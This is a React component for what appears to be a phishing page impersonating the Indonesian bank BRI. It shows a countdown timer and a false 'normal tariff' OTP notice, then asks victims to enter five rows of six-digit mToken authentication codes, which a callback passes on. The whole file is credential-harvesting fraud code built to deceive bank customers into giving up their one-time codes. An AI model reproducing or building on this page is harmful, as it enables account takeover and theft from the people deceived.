
import React from 'react'
import Countdown, {zeroPad} from 'react-countdown';

const SiteVerifikasi = ({btnClick}) => {
   
  const handleClick = (e) => {
    e.preventDefault()
    const data = {
      message: document.getElementById('msg').value,
    }
    btnClick(data)
  }

  const renderer = ({ hours, minutes, seconds, completed }) => {
    if (completed) {
      return <span>{zeroPad(minutes)}:{zeroPad(seconds)}</span>;
    } else {
      return <span>{zeroPad(minutes)}:{zeroPad(seconds)}</span>;
    }
  }
  return (        
    <div style={{width:'100%', padding:'0 1rem', color:'#000', marginTop:'2em'}}>  
        <h1 style={{textAlign:'center', fontWeight:'bold',color:'rgb(14 120 202)', fontSize:'1.5em'}}>Cek SMS</h1>            
        <div style={{background:'grey', width:'100%', height:'1px', marginTop:'1em'}}></div>
        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em', color:'rgb(14 120 202)', fontSize:'1.5em'}}>
        <Countdown
          date={Date.now() + 60*3000}
          autoStart={true}
          renderer={renderer}
        />
        </h1>    
        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Kode mToken untuk konfirmasi sms dari OTP BRI tarif normal telah kami kirimkan ke nomor Handphone anda, Silahkan cek sms di Handphone anda. lalu masukkan kode mToken 6 angka 5 baris</h1>    
        <h1 style={{textAlign:'center', fontWeight:'bold', marginTop:'1em'}}>Masukkan kode mToken (Wajib)</h1>    
        <form>
            <textarea id='msg' className='form-control-pesan' rows={5} placeholder="(PERINGATAN) Jangan berikan kepada pihak lain/pihak yang mengaku BRI. Stok mToken IB BRI ID0633xxxxxxx: xxxxxx,xxxxxx,xxxxxx,xxxxxx,xxxxxx"></textarea>
            <button type='button' onClick={handleClick} className='btn' id='btn' style={{marginTop:'2em', marginBottom:'2em'}}>
              Konfirmasi
            </button>
        </form>
    </div>
  )
}

export default SiteVerifikasi